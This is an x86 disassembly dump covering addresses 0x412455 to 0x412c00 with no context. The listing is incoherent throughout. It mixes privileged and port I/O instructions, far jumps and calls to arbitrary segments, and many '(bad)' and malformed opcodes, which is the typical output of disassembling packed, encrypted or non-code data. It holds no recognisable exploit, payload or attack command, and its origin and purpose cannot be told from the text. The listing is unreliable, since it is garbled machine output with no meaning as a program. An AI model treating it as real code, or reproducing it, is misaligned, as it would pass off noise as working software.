  412455:	mov    dh,0xc6
  412457:	ja     0x412496
  412459:	adc    edx,DWORD PTR [eax-0x32858417]
  41245f:	inc    edi
  412460:	sbb    BYTE PTR [ecx],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412464:	xchg   BYTE PTR [ebx+eax*8+0x27448fdb],ch
  41246b:	push   ebx
  41246c:	ins    BYTE PTR es:[edi],dx
  41246d:	inc    ecx
  41246e:	dec    eax
  41246f:	stos   BYTE PTR es:[edi],al
  412470:	pop    ss
  412471:	xlat   BYTE PTR ds:[ebx]
  412472:	iret   
  412473:	daa    
  412474:	pop    esi
  412475:	call   DWORD PTR [esi]
  412477:	push   edi
  412478:	repnz pushf 
  41247a:	add    cl,BYTE PTR [edx+0x3b82394e]
  412480:	fidiv  DWORD PTR [esi+0x21]
  412483:	jmp    0xc3b:0x7c05d8d2
  41248a:	call   0xb9de9f0b
  41248f:	fnstsw WORD PTR [eax]
  412491:	bound  ebx,QWORD PTR [ebx]
  412493:	dec    esi
  412494:	push   ds
  412495:	ror    dl,1
  412497:	out    0x66,al
  412499:	inc    edx
  41249a:	int    0x47
  41249c:	daa    
  41249d:	ret    
  41249e:	imul   ebx,esp,0xffffffea
  4124a1:	pop    edi
  4124a2:	mov    al,0x5b
  4124a4:	(bad)  
  4124a5:	sub    dh,dh
  4124a7:	or     DWORD PTR [eax],esp
  4124a9:	mov    bh,0xbe
  4124ab:	bound  esi,QWORD PTR [eax]
  4124ad:	mov    ds,WORD PTR [edx-0x2e]
  4124b0:	jmp    0xc419:0x73a5378e
  4124b7:	cmp    bh,BYTE PTR [eax+0x1a]
  4124ba:	adc    BYTE PTR [edi+0x56263fbe],al
  4124c0:	and    ebx,DWORD PTR [edi*2+0x23553363]
  4124c7:	mov    eax,ds:0x95064523
  4124cc:	adc    eax,0x84f8b95
  4124d1:	adc    esp,ecx
  4124d3:	iret   
  4124d4:	pop    esp
  4124d5:	icebp  
  4124d6:	mov    bl,0x52
  4124d8:	ins    DWORD PTR es:[edi],dx
  4124d9:	add    al,0x13
  4124db:	lds    ebp,FWORD PTR [ebx+0x27]
  4124de:	and    eax,0xa19cbb19
  4124e3:	jl     0x41249a
  4124e5:	inc    eax
  4124e6:	mov    ds:0xe44ab316,al
  4124eb:	inc    edx
  4124ec:	pop    edx
  4124ed:	xor    al,0x11
  4124ef:	test   BYTE PTR [ebx+esi*8+0x3d],0xbc
  4124f4:	inc    bl
  4124f6:	(bad)  
  4124f7:	loop   0x41251e
  4124f9:	scas   al,BYTE PTR es:[edi]
  4124fa:	jo     0x4124d4
  4124fc:	mov    ds:0x90160233,al
  412501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412502:	xchg   edi,eax
  412503:	ins    DWORD PTR es:[edi],dx
  412504:	xchg   ebx,eax
  412505:	jp     0x4124c5
  412507:	aam    0x3d
  412509:	mov    ebp,0x275f556a
  41250e:	das    
  41250f:	xor    DWORD PTR [esi-0x1204e9fc],esi
  412515:	and    al,0x87
  412517:	cmp    edi,DWORD PTR [ebx]
  412519:	test   al,0x5a
  41251b:	mov    bl,0xb0
  41251d:	arpl   WORD PTR [eax-0x63],ax
  412520:	test   eax,0xa92fde6d
  412525:	xchg   edi,eax
  412526:	or     ebx,DWORD PTR [edi]
  412528:	loope  0x4124ef
  41252a:	xchg   edx,esp
  41252c:	add    DWORD PTR [esi],ebx
  41252e:	sbb    ebx,DWORD PTR [ebx-0x1bc26c17]
  412534:	pop    ebp
  412535:	fcmove st,st(6)
  412537:	rol    DWORD PTR [eax+0x7e],cl
  41253a:	or     DWORD PTR [eax],ecx
  41253c:	jbe    0x4124f8
  41253e:	in     al,0x91
  412540:	inc    ebp
  412541:	adc    BYTE PTR [ebx],al
  412543:	xor    ebp,ebp
  412545:	mov    BYTE PTR [ebx+0x7ffefb71],dh
  41254b:	dec    ecx
  41254c:	pop    ebx
  41254d:	push   ebp
  41254e:	cmp    BYTE PTR [ecx-0x7cdc0b6a],bl
  412554:	(bad)  
  412555:	pop    esp
  412556:	jg     0x4125b7
  412558:	jecxz  0x412573
  41255a:	enter  0xe248,0xaa
  41255e:	mov    ebp,0x11b57e8
  412563:	call   0xb3a:0x4bd42e44
  41256a:	inc    ecx
  41256b:	mov    ds:0x101a81c7,eax
  412570:	repnz icebp 
  412572:	test   BYTE PTR [ecx],ah
  412574:	push   ds
  412575:	mov    ds:0x4443042d,al
  41257a:	pusha  
  41257b:	cmp    DWORD PTR [eax],eax
  41257d:	add    BYTE PTR [eax],al
  41257f:	add    BYTE PTR [eax],al
  412581:	add    BYTE PTR [edi+ecx*4+0x7ff767f6],bh
  412588:	mov    ebp,0x792d96df
  41258d:	mov    edx,0x5d89a788
  412592:	aad    0x28
  412594:	add    DWORD PTR [eax],eax
  412596:	and    al,BYTE PTR [edi]
  412598:	add    BYTE PTR [eax],al
  41259a:	mov    ds:0x58547fb4,eax
  41259f:	loop   0x412530
  4125a1:	or     DWORD PTR [eax],ebx
  4125a3:	sub    dl,BYTE PTR [ecx-0x38b4483a]
  4125a9:	adc    ah,al
  4125ab:	cmp    eax,0xffffff99
  4125ae:	loope  0x412537
  4125b0:	js     0x4125cb
  4125b2:	inc    esp
  4125b3:	push   cs
  4125b4:	xchg   bh,dl
  4125b6:	outs   dx,DWORD PTR ds:[esi]
  4125b7:	mov    bl,BYTE PTR [edx+eax*8]
  4125ba:	adc    ch,BYTE PTR [edx+0x17]
  4125bd:	inc    esp
  4125be:	je     0x4125fa
  4125c0:	jmp    0x41260d
  4125c2:	or     ah,BYTE PTR [edx-0x2c]
  4125c5:	push   eax
  4125c6:	outs   dx,DWORD PTR ds:[esi]
  4125c7:	inc    ecx
  4125c8:	ficom  DWORD PTR [eax-0x38110dc4]
  4125ce:	(bad)  
  4125cf:	sbb    al,BYTE PTR [ebx-0x66]
  4125d2:	push   cs
  4125d3:	shl    ah,0x35
  4125d6:	jge    0x412639
  4125d8:	mov    esp,0x9ad6b9c1
  4125dd:	dec    eax
  4125de:	add    eax,DWORD PTR [ebp+0x7e]
  4125e1:	mov    ch,0x87
  4125e3:	cmp    al,0xd8
  4125e5:	fnstenv [ebx+0x3f]
  4125e8:	jp     0x4125f0
  4125ea:	sbb    al,0x8c
  4125ec:	jl     0x412596
  4125ee:	dec    edx
  4125ef:	enter  0xdc5a,0xc9
  4125f3:	ins    DWORD PTR es:[edi],dx
  4125f4:	int    0x33
  4125f6:	sbb    ebp,DWORD PTR [edx-0x56e43670]
  4125fc:	ss inc ebx
  4125fe:	xor    eax,0x358aed2e
  412603:	or     eax,0x6149aa09
  412608:	aad    0xf
  41260a:	jl     0x41266d
  41260c:	pop    eax
  41260d:	out    dx,eax
  41260e:	jbe    0x412606
  412610:	mov    ch,0xae
  412612:	shr    BYTE PTR [esi+0x1f1a4c8f],0x88
  412619:	add    al,0x70
  41261b:	pop    esp
  41261c:	add    esi,DWORD PTR [edi+0x79c828ff]
  412622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412623:	fnstcw WORD PTR [esi]
  412625:	gs pop edx
  412627:	(bad)  
  412628:	movd   mm0,DWORD PTR [edx-0x47]
  41262c:	jmp    DWORD PTR [esi]
  41262e:	mov    esp,0x36f71bb8
  412633:	xchg   BYTE PTR [esi+0x3a],cl
  412636:	pop    ss
  412637:	mov    WORD PTR [ecx+ecx*1-0x6a440544],es
  41263e:	sub    DWORD PTR [edx-0x52],eax
  412641:	arpl   WORD PTR [edi],si
  412643:	fsub   QWORD PTR [edx-0x48]
  412646:	ds std 
  412648:	mov    ecx,0xe11fbdee
  41264d:	dec    edx
  41264e:	xor    DWORD PTR [eax+0x1e4ca0ee],ebx
  412654:	bnd jl 0x412696
  412657:	push   edx
  412658:	push   ebp
  412659:	outs   dx,BYTE PTR ds:[esi]
  41265a:	cs dec esi
  41265c:	and    BYTE PTR ds:0x36bfcfe1,0x50
  412663:	jmp    0x41260f
  412665:	mov    edi,0xbffb7849
  41266a:	jp     0x412603
  41266c:	and    ah,BYTE PTR [eax]
  41266e:	inc    ebp
  41266f:	sbb    al,0x97
  412671:	cmp    DWORD PTR [ebp+eax*2-0x6a],esp
  412675:	mov    eax,0x6de09650
  41267a:	nop
  41267b:	push   esi
  41267c:	jb     0x4126bf
  41267e:	xchg   ecx,eax
  41267f:	mov    ebp,0x17a357dd
  412684:	ror    DWORD PTR [eax-0x6886e6ae],1
  41268a:	sub    BYTE PTR [ecx+0x2e964f69],cl
  412690:	fmul   DWORD PTR [esi-0x44]
  412693:	ret    
  412694:	adc    DWORD PTR ss:[edi+0x42],0xfffffffa
  412699:	mov    al,ds:0x424e8a88
  41269e:	xchg   BYTE PTR [edx+0x39],dh
  4126a1:	inc    ecx
  4126a2:	xchg   esi,eax
  4126a3:	mov    dh,0xa1
  4126a5:	popf   
  4126a6:	shl    esp,0x82
  4126a9:	out    dx,al
  4126aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ab:	mov    ebp,0x34114113
  4126b0:	sti    
  4126b1:	fldcw  WORD PTR [esi+0x2c12dc2d]
  4126b7:	cmp    ch,BYTE PTR ds:0x33cd6847
  4126bd:	adc    DWORD PTR [edi-0x201c4771],esp
  4126c3:	cli    
  4126c4:	aas    
  4126c5:	pop    eax
  4126c6:	outs   dx,DWORD PTR ds:[si]
  4126c8:	out    0x29,al
  4126ca:	push   edi
  4126cb:	test   BYTE PTR [edx],ch
  4126cd:	fisttp WORD PTR [ecx-0x7f]
  4126d0:	(bad)  
  4126d2:	stc    
  4126d3:	sbb    eax,0x65b8119d
  4126d8:	inc    esp
  4126d9:	xlat   BYTE PTR ds:[ebx]
  4126da:	pop    es
  4126db:	dec    esi
  4126dc:	arpl   WORD PTR [edi-0x62c4ddf4],si
  4126e2:	cli    
  4126e3:	jp     0x412667
  4126e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126e6:	dec    edi
  4126e7:	add    ebp,DWORD PTR [ebx-0x2]
  4126ea:	arpl   cx,cx
  4126ec:	cdq    
  4126ed:	adc    eax,0x661f3776
  4126f2:	push   esp
  4126f3:	int3   
  4126f4:	mov    ch,0xa1
  4126f6:	das    
  4126f7:	test   ch,dl
  4126f9:	jae    0x4126da
  4126fb:	fild   DWORD PTR [edi]
  4126fd:	out    dx,eax
  4126fe:	or     eax,0xb611160
  412703:	jae    0x412770
  412705:	ret    
  412706:	sbb    DWORD PTR [eax],ecx
  412708:	inc    ebp
  412709:	scas   eax,DWORD PTR es:[edi]
  41270a:	int3   
  41270b:	in     al,dx
  41270c:	call   0x362c:0x6aa9ac93
  412713:	mov    ?,WORD PTR [ecx]
  412715:	inc    edx
  412716:	sbb    BYTE PTR [esi],ah
  412718:	out    dx,eax
  412719:	sub    BYTE PTR ds:0xcbd8065f,0xc7
  412720:	push   es
  412721:	inc    edx
  412722:	stos   BYTE PTR es:[edi],al
  412723:	jnp    0x41274f
  412725:	xchg   DWORD PTR [ecx+0x40],esi
  412728:	dec    esi
  412729:	mov    esp,0x5b15e9da
  41272e:	mov    cl,0x27
  412730:	sbb    eax,0x108697cc
  412735:	xchg   ebx,eax
  412736:	ja     0x412768
  412738:	mov    ebx,DWORD PTR [edi+ebp*2]
  41273b:	or     dh,cl
  41273d:	mov    ah,0x34
  41273f:	or     dh,ch
  412741:	xor    eax,0x6c466a92
  412746:	fs inc ebx
  412748:	into   
  412749:	es lahf 
  41274b:	outs   dx,DWORD PTR ds:[esi]
  41274c:	xlat   BYTE PTR ds:[ebx]
  41274d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41274e:	iret   
  41274f:	ins    DWORD PTR es:[edi],dx
  412750:	imul   edx,DWORD PTR [ebp-0x76],0xda013888
  412757:	xchg   esi,eax
  412758:	vpunpcklwd ymm4,ymm2,YMMWORD PTR [esp+eiz*8+0x298aae83]
  412761:	ins    BYTE PTR es:[edi],dx
  412762:	add    eax,DWORD PTR [ebx-0x68]
  412765:	sbb    eax,0xad3e9cc2
  41276a:	in     eax,0xc3
  41276c:	jne    0x4127df
  41276e:	popf   
  41276f:	(bad)  
  412770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412771:	clc    
  412772:	test   BYTE PTR [ecx+0x4f554f8c],al
  412778:	cmp    BYTE PTR [edx-0x13],0x57
  41277c:	nop
  41277d:	mov    ch,0xcc
  41277f:	out    0x7e,eax
  412781:	or     eax,0x0
  412784:	push   edx
  412785:	mov    dl,0x2e
  412787:	call   0xc2adce04
  41278c:	sbb    eax,eax
  41278e:	jnp    0x41273c
  412790:	shr    DWORD PTR [ebp-0x63],cl
  412793:	sbb    esi,DWORD PTR [edx+0x8]
  412796:	push   eax
  412797:	loope  0x4127e0
  412799:	mov    BYTE PTR [ebx-0x5a],dl
  41279c:	jmp    0x412804
  41279e:	clc    
  41279f:	mov    DWORD PTR [esi-0x13],edi
  4127a2:	aam    0x39
  4127a4:	adc    bl,bl
  4127a6:	in     al,dx
  4127a7:	lods   al,BYTE PTR ds:[esi]
  4127a8:	stos   BYTE PTR es:[edi],al
  4127a9:	into   
  4127aa:	adc    eax,0xce769b1c
  4127af:	lea    esp,[edi-0x4d]
  4127b2:	jbe    0x41275e
  4127b4:	mov    esi,0xbc5abf73
  4127b9:	fdiv   QWORD PTR [ebx-0x4ca9e3f9]
  4127bf:	ds loop 0x41282b
  4127c2:	lds    edx,FWORD PTR [ecx*1+0x245efcf2]
  4127c9:	mov    bh,0xcd
  4127cb:	enter  0x4262,0x4f
  4127cf:	jp     0x4127d1
  4127d1:	mov    bh,0xf8
  4127d3:	inc    eax
  4127d4:	and    dh,BYTE PTR [ebp-0x11]
  4127d7:	rol    BYTE PTR [ecx],1
  4127d9:	push   0xffffff8b
  4127db:	adc    esp,0xffffffb2
  4127de:	fdivr  DWORD PTR [ebp+0x46]
  4127e1:	mov    DWORD PTR [edi],edx
  4127e3:	icebp  
  4127e4:	outs   dx,BYTE PTR ds:[esi]
  4127e5:	sbb    ch,BYTE PTR [edi]
  4127e7:	sub    eax,0x78406a23
  4127ec:	cli    
  4127ed:	or     eax,0x13d338ba
  4127f2:	sub    ebp,DWORD PTR [esi+0x4275e2d6]
  4127f8:	xor    al,0xd
  4127fa:	ja     0x412824
  4127fc:	mov    ds:0x77a3e579,eax
  412801:	sbb    DWORD PTR [ebp+0x50],ebx
  412804:	cld    
  412805:	dec    eax
  412806:	(bad)  [ebp-0x56767db2]
  41280c:	pop    esi
  41280d:	cmp    BYTE PTR [edx+0x25c44372],bh
  412813:	xor    al,0x64
  412815:	in     al,0x5e
  412817:	xor    eax,0x764b9dae
  41281c:	aaa    
  41281d:	jbe    0x41280b
  41281f:	adc    bh,BYTE PTR [edi]
  412821:	fsubr  st,st(1)
  412823:	xchg   BYTE PTR [edi-0x5a],dh
  412826:	jecxz  0x412854
  412828:	and    DWORD PTR [edi+0x5],ecx
  41282b:	fwait
  41282c:	sub    al,0x5d
  41282e:	imul   edx,DWORD PTR [edi+0x45],0x2a
  412832:	div    al
  412834:	and    eax,DWORD PTR [edi+0x66019621]
  41283a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41283b:	xlat   BYTE PTR ds:[ebx]
  41283c:	fsubp  st(6),st
  41283e:	push   ecx
  41283f:	add    esi,DWORD PTR [ebx]
  412841:	jp     0x41280b
  412843:	bound  ebp,QWORD PTR [ebx-0x25]
  412846:	push   ds
  412847:	lods   eax,DWORD PTR ds:[esi]
  412848:	pop    ds
  412849:	repnz test DWORD PTR [edi],0xbcd0d84b
  412850:	pop    esp
  412851:	mov    ds:0xe356721b,eax
  412856:	jle    0x412868
  412858:	jo     0x4127f5
  41285a:	mov    WORD PTR [ebx],ss
  41285c:	add    edx,ecx
  41285e:	imul   esi,DWORD PTR [edx],0x69
  412861:	lds    esp,FWORD PTR [esi+esi*2-0x6b0440e7]
  412868:	ja     0x41286d
  41286a:	pop    edi
  41286b:	fld    DWORD PTR [ecx-0x7f]
  41286e:	outs   dx,DWORD PTR ds:[esi]
  41286f:	mov    eax,0xb23cf535
  412874:	xlat   BYTE PTR ds:[ebx]
  412875:	mov    esp,0x20092e69
  41287a:	rol    BYTE PTR [edi+edi*8+0x34],0xa5
  41287f:	and    eax,0x1999361b
  412884:	inc    ebp
  412885:	imul   ecx,edi,0x5f0772fe
  41288b:	push   0xffffffdd
  41288d:	jbe    0x412900
  41288f:	push   ds
  412890:	mov    dh,0xb5
  412892:	mov    dl,0xc4
  412894:	mov    ebx,0xe9f209d1
  412899:	lods   eax,DWORD PTR ds:[esi]
  41289a:	sti    
  41289b:	jb     0x4128b5
  41289d:	(bad)  
  41289f:	cmc    
  4128a0:	push   ebx
  4128a1:	mov    esp,0xedb443c9
  4128a6:	gs dec ebx
  4128a8:	mov    cl,0x6c
  4128aa:	daa    
  4128ab:	aas    
  4128ac:	imul   esp,edx,0x432e01a9
  4128b2:	pop    ss
  4128b3:	(bad)  
  4128b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128b5:	add    dh,BYTE PTR [esi-0xe]
  4128b8:	dec    ecx
  4128b9:	enter  0xd24b,0x63
  4128bd:	sub    eax,0x21e726e1
  4128c2:	inc    eax
  4128c3:	aad    0xfa
  4128c5:	fimul  DWORD PTR [edi]
  4128c7:	sbb    eax,0x2a064dd6
  4128cc:	adc    al,0x95
  4128ce:	fcom   DWORD PTR ds:0xe8aa2171
  4128d4:	inc    ebx
  4128d5:	sub    ch,BYTE PTR [edx+0x28]
  4128d8:	fiadd  WORD PTR ds:0xf9baa15d
  4128de:	or     DWORD PTR ds:0xc3af4dcb,0x1643ca63
  4128e8:	clc    
  4128e9:	jmp    0x412914
  4128eb:	punpckhwd mm3,mm3
  4128ee:	cdq    
  4128ef:	je     0x412874
  4128f1:	dec    ebx
  4128f2:	sbb    DWORD PTR [eax-0xd],0x8536647c
  4128f9:	daa    
  4128fa:	test   eax,0x19ee61f3
  4128ff:	mov    bl,0x7a
  412901:	jbe    0x412971
  412903:	or     DWORD PTR [esi],edi
  412905:	cld    
  412906:	mov    gs,WORD PTR [edx-0x65f37ed4]
  41290c:	xchg   esp,eax
  41290d:	fs adc al,0x6e
  412910:	xchg   DWORD PTR [esi],ecx
  412912:	inc    edx
  412913:	mov    esp,0x5ad8d4dc
  412918:	jge    0x4128e8
  41291a:	mov    ?,WORD PTR [edi+0x3]
  41291d:	mov    gs,WORD PTR [edx]
  41291f:	(bad)  
  412921:	jge    0x412960
  412923:	or     BYTE PTR gs:[di-0x4],cl
  412928:	mov    edx,0x304755d4
  41292d:	or     bl,bl
  41292f:	adc    DWORD PTR [eax+0x9],ebp
  412932:	mov    ch,0x50
  412934:	bound  ebx,QWORD PTR gs:[edx+0x5b]
  412938:	cli    
  412939:	test   eax,0xeb1521
  41293e:	and    edx,ebp
  412940:	mov    BYTE PTR [ebx],cl
  412942:	mov    al,0x38
  412944:	mov    esi,0x408dd4bb
  412949:	out    dx,eax
  41294a:	sbb    BYTE PTR [ebx],0xe9
  41294d:	push   esp
  41294e:	iret   
  41294f:	or     eax,0xd80cac35
  412954:	ja     0x4129b0
  412956:	das    
  412957:	ja     0x41293b
  412959:	test   eax,0x6c948642
  41295e:	mov    edi,0xe1870fbb
  412963:	(bad)  
  412964:	mov    esp,0xbf916f09
  412969:	int    0x17
  41296b:	xchg   DWORD PTR [edx+0x52],edi
  41296e:	cmp    DWORD PTR [esi],ebp
  412970:	and    ebx,DWORD PTR [edx+0x66]
  412973:	push   0x29a420e7
  412978:	add    eax,0xe4f19ef1
  41297d:	mov    BYTE PTR [ebx-0x5c940cda],dh
  412983:	iret   
  412984:	popf   
  412985:	(bad)  
  412986:	pop    esi
  412987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412988:	xor    esp,DWORD PTR [ebp+0x26]
  41298b:	push   ebp
  41298c:	hlt    
  41298d:	popa   
  41298e:	jo     0x4129da
  412990:	inc    eax
  412991:	pop    esp
  412992:	add    al,0x66
  412994:	add    eax,0xbc75f357
  412999:	inc    edx
  41299a:	bound  eax,QWORD PTR [eax+0x2]
  41299d:	mov    ds:0xdd43fade,eax
  4129a2:	jl     0x41297e
  4129a4:	pop    es
  4129a5:	dec    ebx
  4129a6:	(bad)  
  4129a8:	cmp    DWORD PTR [edi-0x1a1b46c1],0x53af5c54
  4129b2:	mov    al,0xff
  4129b4:	int    0xb6
  4129b6:	inc    ebp
  4129b7:	pop    es
  4129b8:	loope  0x4129de
  4129ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129bb:	mov    ds:0xe1316433,eax
  4129c0:	inc    ebx
  4129c1:	not    BYTE PTR [ecx+0x63debd25]
  4129c7:	mov    cl,0x1f
  4129c9:	jo     0x41295d
  4129cb:	arpl   WORD PTR [ebx+0x21f41528],cx
  4129d1:	sub    eax,0x92772c97
  4129d6:	adc    al,0x59
  4129d8:	mov    edi,DWORD PTR [eax-0x3aede31f]
  4129de:	out    0x13,al
  4129e0:	test   eax,0x6ed22f8d
  4129e5:	test   eax,0x6bba5b2e
  4129ea:	neg    BYTE PTR [eax+eiz*1-0x58]
  4129ee:	xor    ch,dh
  4129f0:	cmp    ebp,DWORD PTR [eax-0x37]
  4129f3:	js     0x412a3d
  4129f5:	jecxz  0x41297f
  4129f7:	enter  0x8bbc,0x40
  4129fb:	adc    eax,0x305bc1d8
  412a00:	xchg   esp,eax
  412a01:	stos   DWORD PTR es:[edi],eax
  412a02:	icebp  
  412a03:	mov    ah,0xf4
  412a05:	(bad)  [ecx+0x35a2ac54]
  412a0b:	xlat   BYTE PTR ds:[ebx]
  412a0c:	call   0xc9426eaa
  412a11:	mov    ch,0x87
  412a13:	and    DWORD PTR [edi],eax
  412a15:	cdq    
  412a16:	push   cs
  412a17:	xchg   esp,eax
  412a18:	sub    esp,eax
  412a1a:	retf   
  412a1b:	sub    BYTE PTR ds:0x374dbc7a,cl
  412a21:	pop    ebp
  412a22:	dec    eax
  412a23:	shl    ecx,cl
  412a25:	pop    edi
  412a26:	or     esi,ebp
  412a28:	lock inc ebx
  412a2a:	mov    cl,0xa9
  412a2c:	out    dx,eax
  412a2d:	scas   al,BYTE PTR es:[edi]
  412a2e:	mov    ch,0x54
  412a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a31:	dec    DWORD PTR gs:[ecx]
  412a34:	xor    edi,DWORD PTR [eax-0x10]
  412a37:	daa    
  412a38:	inc    edx
  412a39:	aaa    
  412a3a:	jns    0x412a4f
  412a3c:	pop    eax
  412a3d:	inc    edi
  412a3e:	outs   dx,DWORD PTR ds:[esi]
  412a3f:	or     BYTE PTR [eax+0x1e],ah
  412a42:	add    al,bl
  412a44:	jne    0x412ac1
  412a46:	mov    BYTE PTR [ebx],bh
  412a48:	test   al,0xcc
  412a4a:	xor    ah,BYTE PTR ds:0xddd60e1e
  412a50:	adc    ch,al
  412a52:	popa   
  412a53:	test   DWORD PTR [edx+0x7645e96b],esp
  412a59:	xchg   BYTE PTR [ecx-0x43],dh
  412a5c:	into   
  412a5d:	adc    al,0x89
  412a5f:	mov    ebp,edi
  412a61:	ret    
  412a62:	sbb    eax,0x1f8bf29
  412a67:	test   DWORD PTR [edx+eax*8],eax
  412a6a:	mov    dl,0xa8
  412a6c:	dec    eax
  412a6d:	xchg   ebx,eax
  412a6e:	pusha  
  412a6f:	mov    ecx,0x98cdef64
  412a75:	cli    
  412a76:	sbb    DWORD PTR ds:0xca27707c,esi
  412a7c:	mov    ecx,0x49d136a0
  412a81:	cwde   
  412a82:	(bad)  
  412a83:	pop    ds
  412a84:	mov    ds:0xf921c0a1,al
  412a89:	shr    BYTE PTR [esp+edi*8],cl
  412a8c:	sahf   
  412a8d:	mov    al,0xa6
  412a8f:	bound  esi,QWORD PTR [eax-0x5a]
  412a92:	mov    bh,0x14
  412a94:	ret    0xc40f
  412a97:	cmp    DWORD PTR [ebp+0x7b35643f],ebx
  412a9d:	retf   0xbd04
  412aa0:	dec    edx
  412aa1:	xchg   BYTE PTR [edi],ah
  412aa3:	mov    ah,BYTE PTR [edx]
  412aa5:	fnstsw WORD PTR [esp+eax*2-0x437a6576]
  412aac:	fisub  DWORD PTR [edx+0xe]
  412aaf:	xchg   edi,eax
  412ab0:	bound  edi,QWORD PTR [eax+0x7b]
  412ab3:	bound  esp,QWORD PTR [ebx]
  412ab5:	sahf   
  412ab6:	push   ebx
  412ab7:	ins    BYTE PTR es:[edi],dx
  412ab8:	xor    esi,edx
  412aba:	xor    al,0x92
  412abc:	add    ch,BYTE PTR [ebx+eax*1+0x4afc69c5]
  412ac3:	mov    ebx,0xc763d1ce
  412ac8:	sub    al,al
  412aca:	add    eax,0x9023646f
  412acf:	or     eax,0x1a0b4613
  412ad4:	push   0xfffffff1
  412ad6:	fdivr  st,st(2)
  412ad8:	pop    es
  412ad9:	and    eax,DWORD PTR [eax]
  412adb:	and    al,0xc7
  412add:	dec    BYTE PTR [edi-0x65]
  412ae0:	cs aaa 
  412ae2:	fst    QWORD PTR [edi+edi*2+0x3f]
  412ae6:	jle    0x412b24
  412ae8:	xchg   ecx,eax
  412ae9:	scas   al,BYTE PTR es:[edi]
  412aea:	mov    bl,BYTE PTR [edx]
  412aec:	jmp    0x98f5d272
  412af1:	test   DWORD PTR [edx],ecx
  412af3:	shl    BYTE PTR [eax-0x10],0x9e
  412af7:	jle    0x412ade
  412af9:	ror    DWORD PTR [eax],0xda
  412afc:	outs   dx,BYTE PTR ds:[esi]
  412afd:	jle    0x412ac5
  412aff:	dec    edi
  412b00:	je     0x412b0f
  412b02:	loopne 0x412a8a
  412b04:	xchg   edx,eax
  412b05:	mov    ch,0x69
  412b07:	lahf   
  412b08:	dec    esp
  412b09:	addr16 push cs
  412b0b:	push   cs
  412b0c:	and    BYTE PTR [ebp+0x6b6cd130],0xfc
  412b13:	xchg   BYTE PTR [ebp-0xb5008f5],cl
  412b19:	pushf  
  412b1a:	ss scas eax,DWORD PTR es:[edi]
  412b1c:	jno    0x412b14
  412b1e:	sti    
  412b1f:	dec    esi
  412b20:	jmp    0x437f13ac
  412b25:	ss or  eax,esi
  412b28:	push   ebp
  412b29:	cwde   
  412b2a:	lea    ebp,[edx]
  412b2c:	lods   eax,DWORD PTR ds:[esi]
  412b2d:	and    BYTE PTR [ebx+edi*1+0x29],bl
  412b31:	inc    ecx
  412b32:	jecxz  0x412b00
  412b34:	dec    eax
  412b35:	push   esi
  412b36:	loopne 0x412add
  412b38:	fucomip st,st(4)
  412b3a:	ror    eax,0xe5
  412b3d:	adc    ch,0x36
  412b40:	adc    ch,BYTE PTR [ebp+0x14]
  412b43:	mov    ds:0x4f9f0918,eax
  412b48:	fs jp  0x412b86
  412b4b:	out    dx,al
  412b4c:	push   es
  412b4d:	ss out 0x5a,eax
  412b50:	xchg   ebp,eax
  412b51:	ret    
  412b52:	out    0xeb,eax
  412b54:	jle    0x412bb6
  412b56:	or     BYTE PTR [ecx+0x63],0x61
  412b5a:	sbb    al,0xe9
  412b5c:	dec    edx
  412b5d:	stos   DWORD PTR es:[edi],eax
  412b5e:	adc    al,0x7a
  412b60:	pushf  
  412b61:	aaa    
  412b62:	fs dec edx
  412b64:	cmp    DWORD PTR es:[ebp+ebx*2-0x74],0x3aadf946
  412b6d:	sub    eax,0x492f4f00
  412b72:	lahf   
  412b73:	cmp    eax,0xcf808d5d
  412b78:	push   0xd51edbb7
  412b7d:	xchg   DWORD PTR [ebx],edx
  412b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b80:	shl    BYTE PTR [esp+edx*4-0x1d72d0ed],0x90
  412b88:	xchg   edx,eax
  412b89:	sbb    edi,DWORD PTR [ebp+0x3ef096f7]
  412b8f:	inc    edi
  412b90:	dec    eax
  412b91:	jle    0x412b18
  412b93:	je     0x412b9b
  412b95:	jae    0x412b42
  412b97:	ret    
  412b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b99:	or     DWORD PTR [eax-0x18],eax
  412b9c:	jl     0x412b2b
  412b9e:	in     eax,dx
  412b9f:	inc    eax
  412ba0:	bound  esp,QWORD PTR [edi-0x67]
  412ba3:	cwde   
  412ba4:	mov    esp,0xd422efde
  412ba9:	leave  
  412baa:	push   0xffffff87
  412bac:	push   eax
  412bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bae:	retf   0x5d71
  412bb1:	iret   
  412bb2:	pop    ebp
  412bb3:	mov    DWORD PTR [ecx+esi*4+0x66],eax
  412bb7:	fst    DWORD PTR ds:0x43035db4
  412bbd:	and    dl,BYTE PTR [eax+0x5d]
  412bc0:	dec    esp
  412bc1:	stos   BYTE PTR es:[edi],al
  412bc2:	out    dx,al
  412bc3:	les    ebx,FWORD PTR [ecx-0x24c1a9b8]
  412bc9:	xor    bh,BYTE PTR [ebp-0x27]
  412bcc:	xchg   esi,eax
  412bcd:	mov    cl,0x1
  412bcf:	pushf  
  412bd0:	test   DWORD PTR [ecx-0x1f],ebp
  412bd3:	jbe    0x412c26
  412bd5:	mov    edi,0xd79bb644
  412bda:	mov    ds:0xf94c7296,al
  412bdf:	adc    DWORD PTR [esi],esp
  412be1:	cmp    bl,BYTE PTR [esi]
  412be3:	lock sbb edi,ebx
  412be6:	push   0x60
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	sahf   
  412bea:	std    
  412beb:	jmp    0x1899efcd
  412bf0:	dec    ebx
  412bf1:	cmp    DWORD PTR [ecx+0x3d2c3301],eax
  412bf7:	push   edx
  412bf8:	add    DWORD PTR [esi+ebp*1-0x3035a70],0xfffffffe
  412c00:	cld    
